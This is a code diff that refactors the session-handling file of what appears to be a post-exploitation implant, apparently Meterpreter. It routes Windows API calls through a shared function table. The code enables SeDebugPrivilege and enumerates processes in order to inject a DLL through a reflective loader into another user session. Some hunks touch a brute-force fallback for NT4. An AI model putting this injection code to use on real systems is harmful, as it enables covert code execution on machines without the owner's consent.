@@ -1,4 +1,5 @@
 #include "precomp.h"
+#include "common_metapi.h"
 #include "session.h"
 
 /*
@@ -8,31 +9,16 @@
  */
 DWORD session_id( DWORD dwProcessId )
 {
-	typedef BOOL (WINAPI * PROCESSIDTOSESSIONID)( DWORD pid, LPDWORD id );
-
-	static PROCESSIDTOSESSIONID pProcessIdToSessionId = NULL;
-	HMODULE hKernel   = NULL;
 	DWORD dwSessionId = 0;
 
-	do
+	met_api->win_api.kernel32.SetLastError(ERROR_PROC_NOT_FOUND);
+	if( !met_api->win_api.kernel32.ProcessIdToSessionId( dwProcessId, &dwSessionId ) )
 	{
-		if( !pProcessIdToSessionId )
-		{
-			hKernel = LoadLibrary( "kernel32.dll" );
-			if( hKernel )
-				pProcessIdToSessionId = (PROCESSIDTOSESSIONID)GetProcAddress( hKernel, "ProcessIdToSessionId" );
-		}
-
-		if( !pProcessIdToSessionId )
-			break;
-
-		if( !pProcessIdToSessionId( dwProcessId, &dwSessionId ) )
+		// ProcessIdToSessionId is absent on NT4, where session zero is the
+		// historical fallback. Other failures still mean "unknown".
+		if( met_api->win_api.kernel32.GetLastError() != ERROR_PROC_NOT_FOUND )
 			dwSessionId = -1;
-
-	} while( 0 );
-
-	if( hKernel )
-		FreeLibrary( hKernel );
+	}
 
 	return dwSessionId;
 }
@@ -43,32 +29,7 @@ DWORD session_id( DWORD dwProcessId )
  */
 DWORD session_activeid()
 {
-	typedef DWORD (WINAPI * WTSGETACTIVECONSOLESESSIONID )( VOID );
-
-	static WTSGETACTIVECONSOLESESSIONID pWTSGetActiveConsoleSessionId = NULL;
-	HMODULE hKernel   = NULL;
-	DWORD dwSessionId = 0;
-
-	do
-	{
-		if( !pWTSGetActiveConsoleSessionId )
-		{
-			hKernel = LoadLibrary( "kernel32.dll" );
-			if( hKernel )
-				pWTSGetActiveConsoleSessionId = (WTSGETACTIVECONSOLESESSIONID)GetProcAddress( hKernel, "WTSGetActiveConsoleSessionId" );
-		}
-
-		if( !pWTSGetActiveConsoleSessionId )
-			break;
-
-		dwSessionId = pWTSGetActiveConsoleSessionId();
-
-	} while( 0 );
-
-	if( hKernel )
-		FreeLibrary( hKernel );
-
-	return dwSessionId;
+	return met_api->win_api.kernel32.WTSGetActiveConsoleSessionId();
 }
 
 /*
@@ -85,11 +46,11 @@ DWORD _session_inject_bruteforce( DWORD dwSessionId, DLL_BUFFER * pDllBuffer, LP
 		{
 			HANDLE hProcess = NULL;
 
-			hProcess = OpenProcess( PROCESS_QUERY_INFORMATION, FALSE, pid );
+			hProcess = met_api->win_api.kernel32.OpenProcess( PROCESS_QUERY_INFORMATION, FALSE, pid );
 			if( !hProcess )
 				continue;
 
-			CloseHandle( hProcess );
+			met_api->win_api.kernel32.CloseHandle( hProcess );
 
 			if( dwSessionId == session_id( pid ) )
 			{
@@ -113,11 +74,7 @@ DWORD _session_inject_bruteforce( DWORD dwSessionId, DLL_BUFFER * pDllBuffer, LP
 DWORD session_inject( DWORD dwSessionId, DLL_BUFFER * pDllBuffer, LPCSTR reflectiveLoader, char * cpCommandLine )
 {
 	DWORD dwResult                                     = ERROR_INVALID_HANDLE;
-	CREATETOOLHELP32SNAPSHOT pCreateToolhelp32Snapshot = NULL;
-	PROCESS32FIRSTW pProcess32FirstW                     = NULL;
-	PROCESS32NEXTW pProcess32NextW                     = NULL;
 	HANDLE hProcessSnap                                = NULL;
-	HMODULE hKernel                                    = NULL;
 	HANDLE hToken                                      = NULL;
 	BOOL bUseBruteForce                                = TRUE;
 	PROCESSENTRY32W pe32                                = {0};
@@ -125,40 +82,29 @@ DWORD session_inject( DWORD dwSessionId, DLL_BUFFER * pDllBuffer, LPCSTR reflect
 	do
 	{
 		// If we can, get SeDebugPrivilege...
-		if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
+		if( met_api->win_api.advapi32.OpenProcessToken( met_api->win_api.kernel32.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
 		{
 			TOKEN_PRIVILEGES priv = {0};
 
 			priv.PrivilegeCount           = 1;
 			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 			
-			if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid ) )
+			if( met_api->win_api.advapi32.LookupPrivilegeValueA( NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid ) )
 			{
-				if( AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL ) );
+				if( met_api->win_api.advapi32.AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL ) );
 					dprintf("[SESSION] session_inject. Got SeDebugPrivilege!" );
 			}
 
-			CloseHandle( hToken );
+			met_api->win_api.kernel32.CloseHandle( hToken );
 		}
 
-		hKernel = LoadLibrary( "kernel32" );
-		if( !hKernel )
-			break;
-
-		pCreateToolhelp32Snapshot = (CREATETOOLHELP32SNAPSHOT)GetProcAddress( hKernel, "CreateToolhelp32Snapshot" );
-		pProcess32FirstW           = (PROCESS32FIRSTW)GetProcAddress( hKernel, "Process32FirstW" );
-		pProcess32NextW            = (PROCESS32NEXTW)GetProcAddress( hKernel, "Process32NextW" );
-
-		if( !pCreateToolhelp32Snapshot || !pProcess32FirstW || !pProcess32NextW )
-			break;
-
-		hProcessSnap = pCreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
+		hProcessSnap = met_api->win_api.kernel32.CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
 		if( hProcessSnap == INVALID_HANDLE_VALUE )
 			break;
 
 		pe32.dwSize = sizeof( PROCESSENTRY32W );
 
-		if( !pProcess32FirstW( hProcessSnap, &pe32 ) )
+		if( !met_api->win_api.kernel32.Process32FirstW( hProcessSnap, &pe32 ) )
 			break;
 				
 		bUseBruteForce = FALSE;
@@ -179,16 +125,13 @@ DWORD session_inject( DWORD dwSessionId, DLL_BUFFER * pDllBuffer, LPCSTR reflect
 					break;
 				}
 			}
-		} while( pProcess32NextW( hProcessSnap, &pe32 ) );
+		} while( met_api->win_api.kernel32.Process32NextW( hProcessSnap, &pe32 ) );
 
 	} while( 0 );
 
 	if( hProcessSnap )
-		CloseHandle( hProcessSnap );
+		met_api->win_api.kernel32.CloseHandle( hProcessSnap );
 	
-	if( hKernel )
-		FreeLibrary( hKernel );
-
 	// On NT4 we must brute force the process list...
 	if( bUseBruteForce )
 		dwResult = _session_inject_bruteforce( dwSessionId, pDllBuffer, reflectiveLoader, cpCommandLine );
